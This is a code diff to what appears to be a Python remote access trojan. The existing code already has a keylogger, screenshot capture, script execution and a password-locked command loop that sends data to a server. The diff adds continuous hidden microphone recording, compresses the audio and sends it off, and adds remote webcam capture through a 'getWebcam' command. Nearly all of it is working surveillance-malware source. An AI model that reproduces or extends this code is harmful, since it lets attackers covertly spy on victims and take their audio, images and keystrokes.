@@ -15,6 +15,8 @@ import sched
 import datetime
 import zlib
 
+import wave
+
 HOST = '127.0.0.1'
 PORT = 4434
 ACTIVE = False
@@ -141,6 +143,7 @@ def init():
             'kt': 30,
             'ats': False,
             'at': 30,
+            'atr': 1500,
             'sts': False,
             'std': 20,
             'st': 30,
@@ -215,9 +218,12 @@ def send_screenshot():
 
 
 def send_audio():
+    global AUDIO_LOGS
     config = init()
     if config['ats'] and len(AUDIO_LOGS) > 0:
-        print 'SENT AUDIO'
+        for i in AUDIO_LOGS.keys():
+            data_send(GLOBAL_SOCKET, str(AUDIO_LOGS[i]), 'audioLogs')
+        AUDIO_LOGS = {}
     audio_scheduler = sched.scheduler(time.time, time.sleep)
     audio_scheduler.enter(config['at'], 1, send_audio, ())
     audio_scheduler.run()
@@ -316,6 +322,43 @@ class Key(threading.Thread):
         self.start_keylogger()
 
 
+class AudioStreaming(threading.Thread):
+    def __init__(self, rate):
+        super(AudioStreaming, self).__init__()
+
+        self.active = True
+
+        self.chunk = 1024
+        self.format = pyaudio.paInt16
+        self.channel = 1
+        self.rate = rate
+
+        self.frames = []
+
+        self.p = pyaudio.PyAudio()
+
+        self.stream = self.p.open(format=self.format, channels=self.channel, rate=self.rate, input=True,
+                                  frames_per_buffer=self.chunk)
+
+    def run(self):
+        global AUDIO_LOGS
+
+        config = init()
+
+        while self.active:
+            if len(self.frames) > config['at']*4.6:
+                AUDIO_LOGS[get_date_time()] = {
+                    'raw': zlib.compress(b''.join(self.frames)),
+                    'format': self.format,
+                    'channel': self.channel,
+                    'rate': self.rate,
+                }
+                self.frames = []
+            self.frames.append(self.stream.read(self.chunk))
+
+        self.stream.close()
+        self.p.terminate()
+
 # Screen Shots
 class Screenshoter(threading.Thread):
 
@@ -343,9 +386,11 @@ keylogger = Key()
 keylogger.start()
 screenshoter = Screenshoter()
 screenshoter.start()
-
+audioLogger = AudioStreaming(5120)
+audioLogger.start()
 
 def check_info():
+    global UNLOCKED
     return {
         'os_type':          os_type,
         'os':               os_name,
@@ -394,6 +439,16 @@ def get_screenshot():
     })
 
 
+def webcam_shot():
+    cam = vidcap.new_Dev(0, 0)
+    buff, width, height = cam.getbuffer()
+    return str({
+        'webcambits': zlib.compress(buff),
+        'width': width,
+        'height': height,
+    })
+
+
 def data_receive(sock, end='[ENDOFMESSAGE]'):
     received_data = ''
     try:
@@ -426,7 +481,6 @@ def data_send(sock, message, mode, session_id='', end='[ENDOFMESSAGE]'):
         sock.sendall(str(message)+end)
         ACTIVE = True
     except socket.error:
-        ACTIVE = False
         return
 
 
@@ -539,6 +593,9 @@ def reactor():
                         except socket.error:
                             break
 
+                        if len(data['payload']) == 0 and len(data['mode']) == 0:
+                            break
+
                         if data['mode'] == 'unlockClient':
                             pass_key = data['payload']
                             if pass_key == SECRET:
@@ -572,8 +629,13 @@ def reactor():
                                         elif data['mode'] == 'scriptingMode':
                                             output = executeScript(data['payload'])
 
+                                        # Get Desktop Preview
                                         elif data['mode'] == 'getScreen':
                                             output = get_screenshot()
+
+                                        # Get Webcam Preview
+                                        elif data['mode'] == 'getWebcam':
+                                            output = webcam_shot()
 
                                         # Get Processes List
                                         elif data['mode'] == 'getProcessesList':
@@ -609,12 +671,17 @@ def reactor():
                             data_send(server_socket, get_screenshot(), 'getScreen', session_id=data['session_id'])
                             continue
 
+                        # Webcamera Shot
+                        elif data['mode'] == 'getWebcam':
+                            data_send(server_socket, webcam_shot(), 'getWebcam', session_id=data['session_id'])
+                            continue
+
                         else:
                             data_send(server_socket, 'notAuthorized', 'notAuthorized')
                             continue
 
                 else:
-                    pass
+                    break
 
             except socket.error:
                 server_socket.close()
